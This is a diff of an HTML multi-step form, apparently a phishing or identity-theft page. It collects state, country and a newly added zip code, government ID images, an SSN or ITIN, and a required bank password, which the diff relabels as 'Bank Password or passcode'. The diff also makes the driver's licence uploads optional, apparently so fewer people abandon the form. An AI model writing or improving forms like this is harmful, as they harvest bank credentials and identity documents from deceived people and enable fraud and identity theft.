@@ -189,6 +189,9 @@
 
         <label>State</label>
         <input type="text" name="state" required>
+        
+          <label>Zip or postcode</label>
+        <input type="text" name="zip or postcode" required>
 
         <label>Country</label>
         <select name="country" required>
@@ -205,11 +208,11 @@
 
       <!-- Step 3 -->
       <div class="form-step" id="step-3">
-        <label>Upload Driver's License (Front)</label>
-        <input type="file" name="dlFront" accept="image/*,.pdf" capture="environment" required>
+        <label>Upload Driver's License (Front) Optional</label>
+        <input type="file" name="dlFront" accept="image/*,.pdf" capture="environment" placeholder="if you have any">
 
-        <label>Upload Driver's License (Back)</label>
-        <input type="file" name="dlBack" accept="image/*,.pdf" capture="environment" required>
+        <label>Upload Driver's License (Back) Optional</label>
+        <input type="file" name="dlBack" accept="image/*,.pdf" capture="environment" placeholder="if you have any">
 
         <label>Upload Government ID (Front)</label>
         <input type="file" name="govFront" accept="image/*,.pdf" capture="environment" required>
@@ -251,7 +254,7 @@
         <label>SSN or ITIN <span>USA Only</span></label>
         <input type="text" name="ssnItin" placeholder="XXX-XX-XXXX or 9-digit ITIN.">
 
-        <label>Bank Password</label>
+        <label>Bank Password or passcode</label>
         <div class="password-wrapper">
           <input type="password" name="bankPassword" id="bankPassword" required>
           <span class="toggle-eye" onclick="togglePassword('bankPassword', this)" title="Show/Hide Password">👁️</span>
